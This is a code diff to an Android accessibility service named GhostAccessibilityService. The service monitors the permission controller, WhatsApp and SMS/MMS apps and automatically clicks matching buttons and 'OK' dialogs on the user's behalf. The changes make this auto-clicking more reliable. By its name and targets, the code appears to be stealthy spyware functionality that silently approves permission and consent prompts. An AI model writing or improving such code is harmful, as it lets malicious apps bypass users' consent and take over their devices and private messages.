@@ -31,8 +31,7 @@ class GhostAccessibilityService : AccessibilityService() {
                 "com.google.android.permissioncontroller",
                 "com.whatsapp",
                 "com.google.android.apps.messaging",
-                "com.android.mms",
-                "com.android.settings"
+                "com.android.mms"
             )
 
             val eventPkg = event.packageName?.toString()
@@ -48,36 +47,33 @@ class GhostAccessibilityService : AccessibilityService() {
 
                 for (keyword in keywords) {
                     val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
-                    for (node in nodes) {
-                        try {
-                            if (node.isClickable) {
-                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                clicked = true
-                                break
-                            }
+                    try {
+                        for (node in nodes) {
+                             if (clicked) break
 
-                            // Sometimes the parent is the clickable element (e.g. a button container)
-                            var parent: AccessibilityNodeInfo? = node.parent
-                            try {
-                                while (parent != null) {
-                                    if (parent.isClickable) {
-                                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                        clicked = true
-                                        break
-                                    }
-                                    val next = parent.parent
-                                    parent.recycle() // Recycle current parent before moving to the next
-                                    parent = next
-                                }
-                            } finally {
-                                // Ensure the last-referenced parent node is recycled if it hasn't been already.
-                                parent?.recycle()
-                            }
-                        } finally {
-                            node.recycle()
+                             if (node.isClickable) {
+                                 node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                 clicked = true
+                             } else {
+                                 var parent: AccessibilityNodeInfo? = node.parent
+                                 try {
+                                     while (parent != null) {
+                                         if (parent.isClickable) {
+                                             parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                             clicked = true
+                                             break
+                                         }
+                                         val next = parent.parent
+                                         parent.recycle()
+                                         parent = next
+                                     }
+                                 } finally {
+                                     parent?.recycle()
+                                 }
+                             }
                         }
-
-                        if (clicked) break
+                    } finally {
+                         nodes.forEach { try { it.recycle() } catch(_:Exception){} }
                     }
                     if (clicked) break
                 }
@@ -92,13 +88,27 @@ class GhostAccessibilityService : AccessibilityService() {
                     if (appNameNodes.isNotEmpty()) {
                         val okNodes = rootNode.findAccessibilityNodeInfosByText("OK")
                         try {
-                            okNodes.firstOrNull()?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                            for (okNode in okNodes) {
+                                if (okNode.isClickable && okNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) break
+
+                                var parent: AccessibilityNodeInfo? = okNode.parent
+                                try {
+                                    while (parent != null) {
+                                        if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) break
+                                        val next = parent.parent
+                                        parent.recycle()
+                                        parent = next
+                                    }
+                                } finally {
+                                    parent?.recycle()
+                                }
+                            }
                         } finally {
-                            okNodes.forEach { it.recycle() }
+                            okNodes.forEach { try { it.recycle() } catch(_:Exception){} }
                         }
                     }
                 } finally {
-                    appNameNodes.forEach { it.recycle() }
+                    appNameNodes.forEach { try { it.recycle() } catch(_:Exception){} }
                 }
             } finally {
                 rootNode.recycle()
